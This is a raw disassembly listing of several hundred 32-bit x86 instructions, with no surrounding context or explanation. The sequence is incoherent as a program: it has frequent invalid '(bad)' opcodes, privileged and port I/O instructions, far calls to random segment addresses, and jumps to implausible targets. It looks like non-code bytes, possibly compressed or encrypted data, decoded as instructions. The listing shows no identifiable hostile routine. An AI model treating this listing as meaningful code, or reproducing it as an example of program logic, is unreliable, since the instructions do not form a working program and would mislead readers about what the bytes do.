  408a11:	lds    esp,FWORD PTR [ebp+0x23867b20]
  408a17:	(bad)  [edi]
  408a19:	jns    0x408a3f
  408a1b:	call   0x99f8:0x7bd1f9ac
  408a22:	jle    0x408a08
  408a24:	je     0x408a48
  408a26:	pop    esi
  408a27:	xchg   BYTE PTR [ecx+eax*1-0x1e],bh
  408a2b:	and    al,0xea
  408a2d:	cs retf 
  408a2f:	push   ebp
  408a30:	jecxz  0x408a93
  408a32:	gs mov bl,0x63
  408a35:	push   cs
  408a36:	mov    WORD PTR [ecx-0x68],cs
  408a39:	popa   
  408a3a:	loope  0x408aa4
  408a3c:	pop    esp
  408a3d:	xor    al,dh
  408a3f:	xor    eax,0x8e7e2ec8
  408a44:	stos   DWORD PTR es:[edi],eax
  408a45:	jae    0x408a9c
  408a47:	add    bl,BYTE PTR [edx-0x17]
  408a4a:	test   al,0x98
  408a4c:	fdivr  QWORD PTR [esi+0x7a223564]
  408a52:	push   0x3a69efdd
  408a57:	jmp    0x408a50
  408a59:	(bad)  
  408a5a:	popf   
  408a5b:	mul    DWORD PTR [ecx+eiz*4]
  408a5e:	and    edx,DWORD PTR [eax-0x78]
  408a61:	mov    dh,ch
  408a63:	out    dx,eax
  408a64:	fmul   st(5),st
  408a66:	sub    DWORD PTR [edx-0x32],ebx
  408a69:	ss jb  0x408a44
  408a6c:	lea    eax,[esi-0x257c39c9]
  408a72:	jno    0x408aca
  408a74:	sbb    eax,0xd8c0544b
  408a79:	cmc    
  408a7a:	push   eax
  408a7b:	mov    ds:0xed0729a4,eax
  408a80:	cmp    eax,0x5d73214
  408a85:	push   0x30679bbf
  408a8a:	xor    bh,BYTE PTR [ebp+0xf38a405]
  408a90:	call   0xaac56852
  408a95:	mov    al,0x55
  408a97:	push   cs
  408a98:	and    al,0x9e
  408a9a:	sti    
  408a9b:	xor    ebp,edx
  408a9d:	jns    0x408a93
  408a9f:	stos   DWORD PTR es:[edi],eax
  408aa0:	jbe    0x408a98
  408aa2:	rcl    ebp,0x95
  408aa5:	pop    esp
  408aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aa7:	xor    al,0x26
  408aa9:	mov    ecx,0x1e87ca0d
  408aae:	(bad)  
  408aaf:	cli    
  408ab0:	fwait
  408ab1:	aam    0x28
  408ab3:	xchg   edx,eax
  408ab4:	cdq    
  408ab5:	ret    0x3cc
  408ab8:	test   BYTE PTR [ebp+0x50a36d72],dh
  408abe:	sbb    cl,0x13
  408ac1:	dec    esp
  408ac2:	push   0x11
  408ac4:	sbb    eax,esp
  408ac6:	mov    dh,0xdb
  408ac8:	repz test DWORD PTR [ebx+eax*1],edx
  408acc:	pop    eax
  408acd:	jle    0x408a55
  408acf:	add    al,0x6e
  408ad1:	stc    
  408ad2:	out    dx,al
  408ad3:	mov    bl,dh
  408ad5:	sbb    cl,ch
  408ad7:	mov    BYTE PTR ds:0x41cd90a5,bh
  408add:	test   DWORD PTR [edi-0x80],esi
  408ae0:	dec    edx
  408ae1:	dec    edx
  408ae2:	fstp   DWORD PTR [ebp+edi*4-0x50f518f5]
  408ae9:	fcom   QWORD PTR [ebp+0x4473bb40]
  408aef:	inc    ecx
  408af0:	and    BYTE PTR [esi-0x1c],al
  408af3:	sub    DWORD PTR [ecx-0x1f],0x3a72a472
  408afa:	(bad)  
  408afb:	pop    ebx
  408afc:	inc    edi
  408afd:	pop    ebx
  408afe:	inc    ecx
  408aff:	call   0x1bd57719
  408b04:	jb     0x408b5f
  408b06:	inc    edi
  408b07:	inc    ebp
  408b08:	cmc    
  408b09:	dec    eax
  408b0a:	in     al,0xc3
  408b0c:	pop    es
  408b0d:	loop   0x408b2e
  408b0f:	repnz or ebp,esi
  408b12:	iret   
  408b13:	add    BYTE PTR [ebx-0x6d],al
  408b16:	dec    edx
  408b17:	adc    cl,BYTE PTR [esi+0x75]
  408b1a:	or     cl,ah
  408b1c:	jne    0x408aa2
  408b1e:	cs jo  0x408b0f
  408b21:	push   0xa42148f2
  408b26:	dec    ecx
  408b27:	enter  0x3271,0xc6
  408b2b:	sub    al,0xea
  408b2d:	sti    
  408b2e:	sti    
  408b2f:	sar    DWORD PTR [ebx],cl
  408b31:	outs   dx,DWORD PTR ds:[esi]
  408b32:	sbb    eax,esi
  408b34:	std    
  408b35:	inc    eax
  408b36:	mov    al,0xc2
  408b38:	pop    ss
  408b39:	js     0x408b36
  408b3b:	jp     0x408acf
  408b3d:	pop    esi
  408b3e:	retf   
  408b3f:	dec    esi
  408b40:	je     0x408b7e
  408b42:	retf   
  408b43:	sbb    ebx,esp
  408b45:	stos   DWORD PTR es:[edi],eax
  408b46:	adc    dl,BYTE PTR [edi]
  408b48:	cmovo  edi,DWORD PTR [edi+0x2ff4ea65]
  408b4f:	or     al,0x80
  408b51:	fidiv  WORD PTR [ebx+0x7b]
  408b54:	fmul   QWORD PTR [edi-0x50]
  408b57:	xchg   ecx,eax
  408b58:	in     al,0x3
  408b5a:	dec    esi
  408b5b:	call   0x68b457ee
  408b60:	cmp    DWORD PTR [ecx],edi
  408b62:	fdiv   QWORD PTR ds:0x333dcb9a
  408b68:	jge    0x408b6b
  408b6a:	pop    ds
  408b6b:	push   ebp
  408b6c:	pop    ds
  408b6d:	leave  
  408b6e:	jo     0x408b68
  408b70:	scas   al,BYTE PTR es:[edi]
  408b71:	call   0xd9ef:0xc2693a97
  408b78:	mov    eax,0xb218469d
  408b7d:	mov    ah,0xab
  408b7f:	mov    ebp,DWORD PTR [ebx-0x5f636886]
  408b85:	(bad)  
  408b86:	sbb    ah,BYTE PTR [edi+0x61]
  408b89:	jb     0xfdc1c0d7
  408b8f:	jbe    0x408b85
  408b91:	loopne 0x408bd9
  408b93:	fiadd  WORD PTR [ebx-0x659b26a5]
  408b99:	mov    bh,dl
  408b9b:	ret    0xa1fc
  408b9e:	into   
  408b9f:	push   ebp
  408ba0:	lds    esi,FWORD PTR [esi-0x24]
  408ba3:	out    dx,al
  408ba4:	mov    dh,0xfb
  408ba6:	pop    ss
  408ba7:	test   BYTE PTR [edx+ebp*4-0x37732240],ch
  408bae:	dec    esi
  408baf:	lods   al,BYTE PTR ds:[esi]
  408bb0:	(bad)  
  408bb1:	adc    eax,DWORD PTR [esi+ebp*8-0x4bac82c0]
  408bb8:	test   al,0x3b
  408bba:	inc    esi
  408bbb:	pop    eax
  408bbc:	add    eax,0xec2f957c
  408bc1:	add    BYTE PTR [ebx+eax*4-0xbd27e26],dh
  408bc8:	xchg   ecx,eax
  408bc9:	or     esp,esp
  408bcb:	add    al,0x6b
  408bcd:	ret    
  408bce:	shl    BYTE PTR [eax+0x6dd8f2f1],0x86
  408bd5:	add    BYTE PTR [esp+edx*4-0x757350f4],cl
  408bdc:	lea    esp,[edx+0x73a4c19b]
  408be2:	adc    eax,0xa9e4880c
  408be7:	iret   
  408be8:	dec    ebp
  408be9:	fcomip st,st(1)
  408beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bec:	sub    edi,DWORD PTR [edx-0x62f1fb11]
  408bf2:	pusha  
  408bf3:	pop    es
  408bf4:	xchg   BYTE PTR [edx-0x9],bh
  408bf7:	mov    BYTE PTR es:[ecx],al
  408bfa:	hlt    
  408bfb:	adc    edx,ecx
  408bfd:	mov    ds:0xd6f5c5,al
  408c02:	sbb    DWORD PTR [esi-0x5a59419a],esp
  408c08:	daa    
  408c09:	fmul   QWORD PTR [ebp-0x61637c02]
  408c0f:	push   es
  408c10:	pop    ss
  408c11:	xor    edi,DWORD PTR ds:0x320004f3
  408c17:	fmul   st,st(5)
  408c19:	test   BYTE PTR [eax+0x77aed3bf],0xa7
  408c20:	lods   eax,DWORD PTR ds:[esi]
  408c21:	repz pop eax
  408c23:	push   ds
  408c24:	std    
  408c25:	mov    ebp,0x8cdf8c84
  408c2a:	aas    
  408c2b:	pushf  
  408c2c:	fst    QWORD PTR [esi+0x62]
  408c2f:	scas   eax,DWORD PTR es:[edi]
  408c30:	aad    0xe4
  408c32:	aaa    
  408c33:	mov    ch,0x78
  408c35:	mov    esp,0x47fc21b7
  408c3a:	dec    ecx
  408c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3c:	xchg   edi,eax
  408c3d:	xchg   DWORD PTR [edi+eiz*4-0x6476f56],esp
  408c44:	int    0xf5
  408c46:	cmp    BYTE PTR [ebx],bl
  408c48:	lods   eax,DWORD PTR ds:[esi]
  408c49:	pushf  
  408c4a:	or     edi,DWORD PTR ss:[edx+0x7fb168fc]
  408c51:	cs jne 0x408c25
  408c54:	rcr    BYTE PTR [edi+0x3bf361a7],1
  408c5a:	clc    
  408c5b:	dec    eax
  408c5c:	stos   BYTE PTR es:[edi],al
  408c5d:	and    ch,cl
  408c5f:	and    al,0x8f
  408c61:	mov    ah,0xf
  408c63:	enter  0x730c,0x80
  408c67:	xchg   ecx,ebx
  408c69:	sub    al,0x5b
  408c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c6c:	jmp    0x408c5e
  408c6e:	idiv   bx
  408c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c72:	mov    dl,0x83
  408c74:	ds pop eax
  408c76:	add    edi,0x78a1c4c7
  408c7c:	call   0x4b87:0xbf70491e
  408c83:	add    al,0x62
  408c85:	add    al,0x6d
  408c87:	sub    al,0xfe
  408c89:	cld    
  408c8a:	das    
  408c8b:	outs   dx,DWORD PTR ds:[esi]
  408c8c:	ret    0xc561
  408c8f:	xchg   ecx,edx
  408c91:	xchg   DWORD PTR [ebp-0x66],ecx
  408c94:	sar    DWORD PTR [ebx+0x34],0x3a
  408c98:	into   
  408c99:	cmp    edi,DWORD PTR [esi]
  408c9b:	mov    dh,0x10
  408c9d:	loope  0x408c90
  408c9f:	mov    cs,ecx
  408ca1:	shr    DWORD PTR [edi+0xf],0x70
  408ca5:	icebp  
  408ca6:	cld    
  408ca7:	aas    
  408ca8:	push   ds
  408ca9:	lds    eax,FWORD PTR [edx+0x9]
  408cac:	icebp  
  408cad:	ja     0x408c6d
  408caf:	fcomp  QWORD PTR [ebx+ecx*2-0x554b90f]
  408cb6:	stos   BYTE PTR es:[edi],al
  408cb7:	loop   0x408c3b
  408cb9:	mov    ah,0xeb
  408cbb:	call   0x9b509ee5
  408cc0:	push   edx
  408cc1:	sub    bh,BYTE PTR [ebp+0x2d276a31]
  408cc7:	push   eax
  408cc8:	cs nop
  408cca:	test   al,0x3b
  408ccc:	cmp    eax,0xd0566370
  408cd1:	stos   DWORD PTR es:[edi],eax
  408cd2:	add    al,0x3f
  408cd4:	push   ecx
  408cd5:	pop    ecx
  408cd6:	bound  ebp,QWORD PTR [edi+0x3b52b0ae]
  408cdc:	test   eax,0x5d3a0c6d
  408ce1:	fisubr WORD PTR [edi-0x28114821]
  408ce7:	rsm    
  408ce9:	xor    ch,BYTE PTR [ecx+0x1f]
  408cec:	adc    bh,bh
  408cee:	std    
  408cef:	add    BYTE PTR ds:0x1c9a7cd1,0xab
  408cf6:	aas    
  408cf7:	jl     0x408d14
  408cf9:	loopne 0x408d31
  408cfb:	ds xchg ebp,eax
  408cfd:	xor    eax,0x6dabec13
  408d02:	test   eax,0x221df22a
  408d07:	push   0x7e
  408d09:	leave  
  408d0a:	inc    esi
  408d0b:	dec    edi
  408d0c:	imul   esp,DWORD PTR [esp+ebp*4-0x53cc4b3b],0x4b8dd20e
  408d17:	push   ds
  408d18:	mov    dl,0xd8
  408d1a:	outs   dx,BYTE PTR ds:[esi]
  408d1b:	push   edi
  408d1c:	mov    al,ds:0x9cde12e9
  408d21:	les    edi,FWORD PTR [edi]
  408d23:	call   DWORD PTR [ecx-0x31]
  408d26:	in     eax,dx
  408d27:	out    dx,eax
  408d28:	test   eax,0x84619dcf
  408d2d:	out    dx,al
  408d2e:	jecxz  0x408d76
  408d30:	inc    esp
  408d31:	int    0xd2
  408d33:	xchg   ebp,eax
  408d34:	mov    ebx,0xdf615b0b
  408d39:	mov    cl,0x52
  408d3b:	retf   0x99fd
  408d3e:	mov    ds:0xd8d331d3,al
  408d43:	inc    esp
  408d44:	inc    esi
  408d45:	xchg   esp,eax
  408d46:	pusha  
  408d47:	shr    BYTE PTR [ecx],cl
  408d49:	and    ebx,edi
  408d4b:	rcr    DWORD PTR [edx-0x6cba3e63],0xa4
  408d52:	push   eax
  408d53:	cli    
  408d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d55:	call   0xbedd837a
  408d5a:	nop
  408d5b:	jg     0x408d76
  408d5d:	pop    ebp
  408d5e:	pop    ds
  408d5f:	push   0xffffffeb
  408d61:	sbb    cl,ah
  408d63:	fmul   DWORD PTR [eax]
  408d65:	inc    esp
  408d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d67:	in     al,dx
  408d68:	xor    al,0x2d
  408d6a:	jl     0x408d08
  408d6c:	sahf   
  408d6d:	jne    0x408d76
  408d6f:	mov    al,0xf4
  408d71:	dec    esi
  408d72:	and    al,0x67
  408d74:	sar    BYTE PTR [edx],0x12
  408d77:	and    ah,bh
  408d79:	sub    bl,bl
  408d7b:	repnz add eax,0x4917a944
  408d81:	mov    bh,0x50
  408d83:	mov    ecx,0x5f5dfd24
  408d88:	xchg   esi,eax
  408d89:	out    0x67,eax
  408d8b:	push   ecx
  408d8c:	mov    ds:0x269c709d,al
  408d91:	mov    WORD PTR [ecx],?
  408d93:	sbb    DWORD PTR [edi],ebx
  408d95:	push   ds
  408d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d97:	sbb    al,0x31
  408d99:	ds adc eax,0xaa160310
  408d9f:	sti    
  408da0:	or     DWORD PTR [eax],ebx
  408da2:	sub    BYTE PTR [ebp-0x4172d76f],cl
  408da8:	cld    
  408da9:	jns    0x408d2c
  408dab:	xor    dh,BYTE PTR [esi]
  408dad:	ins    DWORD PTR es:[edi],dx
  408dae:	push   0xa1788ec5
  408db3:	jo     0x408d35
  408db5:	fcmovnb st,st(1)
  408db7:	push   edi
  408db8:	retf   
  408db9:	mov    eax,ds:0x2f9723f2
  408dbe:	ds push 0xa6949606
  408dc4:	es (bad) 
  408dc6:	pop    ds
  408dc7:	jmp    0xb745:0x964c7253
  408dce:	mov    cl,0xa9
  408dd0:	enter  0xd5f2,0x4
  408dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dd5:	enter  0x83f3,0xdb
  408dd9:	sahf   
  408dda:	add    eax,0xe1183f10
  408ddf:	imul   eax,DWORD PTR [eax+0x5f],0x29ae5c2d
  408de6:	push   ds
  408de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de8:	xchg   ebp,eax
  408de9:	(bad)  
  408dea:	in     al,0x4a
  408dec:	popf   
  408ded:	in     eax,0xbb
  408def:	test   DWORD PTR [eax-0x61d69a9d],ebp
  408df5:	push   eax
  408df6:	fs pop edi
  408df8:	xchg   edi,eax
  408df9:	ffree  st(2)
  408dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dfc:	dec    DWORD PTR [ebp+0x37]
  408dff:	loopne 0x408e16
  408e01:	loop   0x408e5f
  408e03:	fist   WORD PTR [edi]
  408e05:	push   ebx
  408e06:	ret    0xfc24
  408e09:	mov    eax,0x48a5e296
  408e0e:	in     eax,0x46
  408e10:	fnclex 
  408e12:	cmp    eax,0x83a7329b
  408e17:	loopne 0x408e0d
  408e19:	pop    ebp
  408e1a:	xchg   DWORD PTR [edi-0x6293df25],ecx
  408e20:	jecxz  0x408e01
  408e22:	das    
  408e23:	data16 adc ch,BYTE PTR [bp+di+0x44]
  408e28:	out    0xbd,al
  408e2a:	jp     0x408dc2
  408e2c:	idiv   BYTE PTR [edx]
  408e2e:	repnz mov ebx,0x8581db92
  408e34:	or     cl,BYTE PTR [ebx]
  408e36:	mov    ah,0xb1
  408e38:	adc    BYTE PTR [esi+0x0],al
  408e3b:	and    al,0x4e
  408e3d:	cmp    bh,BYTE PTR [eax]
  408e3f:	jae    0x408e7d
  408e41:	cwde   
  408e42:	and    al,0xc0
  408e44:	call   0xb5eb:0x6c2a0bab
  408e4b:	nop
  408e4c:	out    0xf9,eax
  408e4e:	cli    
  408e4f:	rol    DWORD PTR [edi-0x4d],1
  408e52:	enter  0x7d62,0x82
  408e56:	push   0xffffff8c
  408e58:	fadd   QWORD PTR [eax-0x2]
  408e5b:	repnz or esp,DWORD PTR [ebx-0x28b1a7c1]
  408e62:	lahf   
  408e63:	out    0x98,eax
  408e65:	pop    esi
  408e66:	int3   
  408e67:	push   ds
  408e68:	mov    bh,0x4a
  408e6a:	mov    ?,WORD PTR [ecx+0x5f]
  408e6d:	fs xor al,0xcf
  408e70:	aad    0x73
  408e72:	dec    edi
  408e73:	jno    0x408e8a
  408e75:	and    al,0xda
  408e77:	sub    eax,0x7bfa9abb
  408e7c:	adc    DWORD PTR ds:0x171fa117,esi
  408e82:	cmp    eax,0x39fc5065
  408e87:	shl    BYTE PTR ds:0x943928f1,0x10
  408e8e:	and    al,0x23
  408e90:	mov    DWORD PTR ds:0x24a1072d,eax
  408e96:	sti    
  408e97:	fld    DWORD PTR [ecx-0x40]
  408e9a:	xchg   ebx,eax
  408e9b:	cli    
  408e9c:	cmp    BYTE PTR [ebx+0x78],ah
  408e9f:	int3   
  408ea0:	push   eax
  408ea1:	(bad)  
  408ea2:	popa   
  408ea3:	cli    
  408ea4:	adc    BYTE PTR [ecx-0x4a],dl
  408ea7:	and    DWORD PTR [eax+0x77f5b133],0xffffff99
  408eae:	inc    eax
  408eaf:	pop    esp
  408eb0:	or     edx,DWORD PTR [ebx+ebx*8]
  408eb3:	sar    BYTE PTR [edi+0x1e],0xdd
  408eb7:	xchg   BYTE PTR [ebx-0x22],bl
  408eba:	(bad)  
  408ebb:	(bad)  [eax-0x69]
  408ebe:	addr16 out 0xb0,al
  408ec1:	inc    eax
  408ec2:	out    0x79,eax
  408ec4:	shr    DWORD PTR [edi+eiz*1+0x21],cl
  408ec8:	test   BYTE PTR [edi-0x2ed78f7a],bh
  408ece:	adc    edx,DWORD PTR [ecx]
  408ed0:	jno    0x408f38
  408ed2:	fdivp  st(3),st
  408ed4:	(bad)  
  408ed5:	loopne 0x408e99
  408ed7:	pop    ds
  408ed8:	data16 das 
  408eda:	fsubrp st(1),st
  408edc:	loopne 0x408f25
  408ede:	push   ds
  408edf:	mov    ds:0xf3a8978b,al
  408ee4:	mov    ch,0xf9
  408ee6:	shl    BYTE PTR [ebx-0x3021d122],0xc5
  408eed:	mov    cl,0x21
  408eef:	add    eax,0x17def45
  408ef4:	es inc ecx
  408ef6:	mov    al,ds:0x3431ccd4
  408efb:	out    0x30,eax
  408efd:	(bad)  
  408efe:	mov    dl,0x4f
  408f00:	pushf  
  408f01:	cwde   
  408f02:	jp     0x408f7f
  408f04:	gs or  eax,0x6083c412
  408f0a:	inc    ebx
  408f0b:	sub    eax,0x77d5836d
  408f10:	sbb    BYTE PTR [esi],0x4e
  408f13:	div    DWORD PTR [ebx]
  408f15:	fdivrp st(6),st
  408f17:	js     0x408f14
  408f19:	push   ds
  408f1a:	jo     0x408eb1
  408f1c:	in     al,dx
  408f1d:	or     eax,0x35888c56
  408f22:	or     dl,BYTE PTR [eax+edx*8]
  408f25:	xchg   ebp,eax
  408f26:	jmp    DWORD PTR [esi]
  408f28:	push   0xf1766ac5
  408f2d:	xor    cl,BYTE PTR [ebx+0x4]
  408f30:	inc    ecx
  408f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f32:	and    esi,DWORD PTR [edi+0x65]
  408f35:	and    esp,DWORD PTR [edx]
  408f37:	in     al,dx
  408f38:	fadd   QWORD PTR [ebx+0x21]
  408f3b:	cmp    BYTE PTR ds:0xf712a3a4,0x62
  408f42:	add    ebp,DWORD PTR [edi]
  408f44:	mov    cl,0xfa
  408f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f47:	test   ch,0x52
  408f4a:	cmc    
  408f4b:	xchg   edi,eax
  408f4c:	in     eax,0x15
  408f4e:	imul   DWORD PTR [eax+0x1]
  408f51:	int    0x5a
  408f53:	dec    esp
  408f54:	pop    ds
  408f55:	mov    ebp,0x6a512380
  408f5a:	daa    
  408f5b:	jae    0x408fb3
  408f5d:	aas    
  408f5e:	adc    DWORD PTR [edi-0x49],ebp
  408f61:	(bad)  
  408f62:	aas    
  408f63:	loope  0x408eee
  408f65:	push   esi
  408f66:	(bad)  
  408f67:	pushf  
  408f68:	test   al,0xbf
  408f6a:	adc    DWORD PTR ds:0xefaa1d59,ebp
  408f70:	add    cl,0xc
  408f73:	and    edx,DWORD PTR [eax-0x35]
  408f76:	xchg   DWORD PTR [esi],ebx
  408f78:	sbb    BYTE PTR ds:0x7eaa0195,bl
  408f7e:	jp     0x408f43
  408f80:	xchg   ebx,eax
  408f81:	mov    dl,0xf1
  408f83:	and    eax,0x35b2e450
  408f88:	jge    0x408f4f
  408f8a:	sbb    eax,0xc9007985
  408f8f:	mov    edi,DWORD PTR [edi]
  408f91:	jae    0x408fe9
  408f93:	and    BYTE PTR [ebp-0x101ee9b5],cl
  408f99:	aaa    
  408f9a:	shl    DWORD PTR [ecx],cl
  408f9c:	inc    edi
  408f9d:	je     0x408f37
  408f9f:	(bad)  
  408fa0:	or     BYTE PTR [edx],al
  408fa2:	mov    BYTE PTR [edi],0x9f
  408fa5:	pop    eax
  408fa6:	loopne 0x408fa2
  408fa8:	push   esi
  408fa9:	shl    ebp,1
  408fab:	or     BYTE PTR [edi-0xc],ch
  408fae:	mov    bh,BYTE PTR [ebx+0x48ba2ed4]
  408fb4:	hlt    
  408fb5:	(bad)  
  408fb6:	jle    0x408feb
  408fb8:	push   edx
  408fb9:	sbb    DWORD PTR [edi+0x24221445],edi
  408fbf:	and    DWORD PTR [ebp-0x693685bd],ebx
  408fc5:	and    edi,ebx
  408fc7:	leave  
  408fc8:	xchg   edx,eax
  408fc9:	cmp    dl,BYTE PTR [edx-0x76]
  408fcc:	jg     0x40900d
  408fce:	pop    esi
  408fcf:	popa   
  408fd0:	aaa    
  408fd1:	and    eax,DWORD PTR [esi+edx*1]
  408fd4:	out    dx,al
  408fd5:	add    ah,BYTE PTR [eax+0xe6f1bbf]
  408fdb:	imul   ebx,DWORD PTR [esp+eax*2+0xd9b8abe],0x37
  408fe3:	enter  0xd7bb,0x75
  408fe7:	mov    ah,0x8a
  408fe9:	aas    
  408fea:	xor    al,0x1
  408fec:	in     al,0xab
  408fee:	adc    edx,DWORD PTR ds:0x525f366a
  408ff4:	jnp    0x409036
  408ff6:	push   ecx
  408ff7:	adc    ebx,DWORD PTR [ecx-0x818518]
  408ffd:	ret    
  408ffe:	and    bl,BYTE PTR [ebx+0x11]
  409001:	jnp    0x40901f
  409003:	add    eax,0x3a704f91
  409008:	xor    BYTE PTR ds:0x5b33fed7,ah
  40900e:	sub    ebx,esi
  409010:	mov    ch,0xbb
  409012:	xor    ebx,ecx
  409014:	inc    eax
  409015:	cli    
  409016:	retf   0xd326
  409019:	ss (bad) 
  40901c:	mov    al,ds:0xa201d08a
  409021:	inc    ecx
  409022:	mov    esi,0xb17c34a3
  409027:	push   es
  409028:	adc    BYTE PTR [edx-0x6f2b0183],bh
  40902e:	jecxz  0x409086
  409030:	loop   0x409085
  409032:	mov    ch,0xf3
  409034:	and    cl,BYTE PTR [ebx+0x559d7dd1]
  40903a:	call   0x2a47df07
  40903f:	(bad)  
  409040:	call   0xa8ea98ce
  409045:	and    ebx,DWORD PTR [esi+0xf]
  409048:	jge    0x409023
  40904a:	test   eax,0x6bfae40f
  40904f:	dec    ebx
  409050:	aad    0x2
  409052:	mov    ah,0x8f
  409054:	(bad)  
  409055:	jle    0x409041
  409057:	sub    DWORD PTR [edx+0x304ca130],edx
  40905d:	inc    ebp
  40905e:	data16 lahf 
  409060:	mov    ebx,esp
  409062:	lds    esi,FWORD PTR [edi]
  409064:	sbb    DWORD PTR [esi],edx
  409066:	cs pop ss
  409068:	and    dl,BYTE PTR [edi]
  40906a:	add    edx,ebp
  40906c:	sbb    al,0x36
  40906e:	xor    edx,DWORD PTR [eax]
  409070:	loope  0x409044
  409072:	cmp    DWORD PTR [eax+0x1c],edi
  409075:	test   BYTE PTR [esp+eax*1],cl
  409078:	sub    cl,BYTE PTR es:[edx+0x72e55dd3]
  40907f:	out    dx,al
  409080:	fstp   TBYTE PTR [esi+0x76631b0a]
  409086:	pop    edi
  409087:	loopne 0x409056
  409089:	adc    eax,0xfa38cb09
  40908e:	xlat   BYTE PTR ds:[ebx]
  40908f:	dec    esi
  409090:	sbb    ebx,DWORD PTR ds:0x4b2c
  409095:	fst    DWORD PTR [eax-0x74]
  409098:	addr16 or ah,dh
  40909b:	popa   
  40909c:	xor    BYTE PTR [ebp-0x6c07f135],al
  4090a2:	fsubr  DWORD PTR [esi-0x78c555d8]
  4090a8:	push   esp
  4090a9:	loope  0x40906b
  4090ab:	add    ch,BYTE PTR [esi+0x4829cf3f]
  4090b1:	mov    esp,0xc119fef5
  4090b6:	aad    0x9a
  4090b8:	pop    es
  4090b9:	mul    BYTE PTR [esi+0x4432d3ff]
  4090bf:	push   esi
  4090c0:	pushf  
  4090c1:	jnp    0x409073
  4090c3:	dec    edi
  4090c4:	add    ecx,DWORD PTR [esi-0x50]
  4090c7:	xbegin 0x63ea6143
  4090cd:	into   
  4090ce:	cmp    BYTE PTR [ecx],bl
  4090d0:	or     esp,DWORD PTR [esi-0xbff55ee]
  4090d6:	mov    dh,0x44
  4090d8:	and    DWORD PTR [ebx-0x2e],0x78
  4090dc:	scas   al,BYTE PTR es:[edi]
  4090dd:	mov    DWORD PTR [ecx],esi
  4090df:	pop    ss
  4090e0:	lea    ebp,[ecx+0x7f758f5]
  4090e6:	loope  0x409157
  4090e8:	xchg   ebx,eax
  4090e9:	adc    BYTE PTR [ebp+esi*8-0x59],bh
  4090ed:	ins    BYTE PTR es:[edi],dx
  4090ee:	push   esi
  4090ef:	jnp    0x409157
  4090f1:	xor    BYTE PTR [eax+0x27],ch
  4090f4:	adc    al,0xfb
  4090f6:	pop    ss
  4090f7:	aam    0x5
  4090f9:	(bad)  [eax-0x5b740f8]
  4090ff:	adc    al,bl
  409101:	xor    BYTE PTR ds:0x5a783b53,dh
  409107:	push   0x65
  409109:	mov    dl,0x5a
  40910b:	inc    edi
  40910c:	pop    ds
  40910d:	ficom  DWORD PTR [ecx+esi*2+0x7f220512]
  409114:	xchg   BYTE PTR [esi+0x20102365],ch
  40911a:	pop    esi
  40911b:	outs   dx,DWORD PTR fs:[esi]
  40911d:	mov    ah,0xb5
  40911f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409120:	and    edx,DWORD PTR [eax+eax*8-0x24]
  409124:	sbb    al,0xec
  409126:	outs   dx,DWORD PTR ds:[esi]
  409127:	pop    ss
  409128:	pusha  
  409129:	xor    ebp,DWORD PTR [ebp+0x56]
  40912c:	adc    al,0xec
  40912e:	sahf   
  40912f:	mov    DWORD PTR [edi-0x68],edx
  409132:	pop    esi
  409133:	jmp    0x5b0:0x3c159d8a
  40913a:	scas   al,BYTE PTR es:[edi]
  40913b:	les    ecx,FWORD PTR [esi]
  40913d:	add    al,0xc6
  40913f:	popa   
  409140:	adc    edi,esp
  409142:	test   eax,0x85524d27
  409147:	cmc    
  409148:	das    
  409149:	push   ebx
  40914a:	repnz mov bh,BYTE PTR [ebx-0x659ab8e7]
  409151:	push   eax
  409152:	sbb    eax,0xe9c1dfa5
  409157:	stc    
  409158:	mov    al,BYTE PTR [esp+edx*4]
  40915b:	push   ecx
  40915c:	arpl   cx,si
  40915e:	inc    ebx
  40915f:	ret    0xfcd6
  409162:	out    0x98,eax
  409164:	fwait
  409165:	inc    esp
  409166:	push   0xd9b12b6
  40916b:	or     BYTE PTR [eax+0x7e],al
  40916e:	mov    ebp,0xda904355
  409173:	out    0x6f,eax
  409175:	cmp    DWORD PTR [edx],ebp
  409177:	sub    dl,BYTE PTR [ebx-0x5c911625]
  40917d:	jecxz  0x409111
  40917f:	ss mov cl,0x29
  409182:	stos   BYTE PTR es:[edi],al
  409183:	popf   
  409184:	mov    esi,0x3aed201f
  409189:	cmp    bh,ah
  40918b:	sti    
  40918c:	mov    dl,0xcf
  40918e:	sbb    al,0x8a
  409190:	fdiv   DWORD PTR ds:0xe873a454
  409196:	adc    eax,0x7adce58d
  40919b:	fdivrp st(2),st
  40919d:	cmp    edx,edi
  40919f:	sbb    ebp,esp
  4091a1:	lods   eax,DWORD PTR ds:[esi]
  4091a2:	adc    eax,0xab3a3aa
  4091a7:	jae    0x409211
  4091a9:	push   ecx
  4091aa:	add    BYTE PTR [ebp-0x5b],0xe
  4091ae:	lock (bad) 
  4091b0:	mov    ah,0x8b
  4091b2:	cmp    al,0x3a
  4091b4:	pop    ecx
  4091b5:	mov    DWORD PTR [eax+0x6c],ebp
  4091b8:	xor    eax,0xd448680b
  4091bd:	mov    esp,DWORD PTR [edx]
  4091bf:	popf   
  4091c0:	lods   al,BYTE PTR ds:[esi]
  4091c1:	scas   al,BYTE PTR es:[edi]
  4091c2:	pop    ebx
  4091c3:	mov    ebp,0x4cb495a8
  4091c8:	(bad)  
  4091c9:	mov    esi,0xeea619d7
  4091ce:	loope  0x40921e
  4091d0:	and    ch,BYTE PTR [eax+edx*2-0x51]
  4091d4:	sub    edx,DWORD PTR [edi-0x67a4d428]
  4091da:	int3   
  4091db:	cmp    ebp,DWORD PTR [ebp+ebp*8+0x6c]
  4091df:	sub    DWORD PTR [ebp+ecx*1-0x24],eax
  4091e3:	in     eax,0xf9
  4091e5:	sbb    al,0x90
  4091e7:	enter  0x351c,0x14
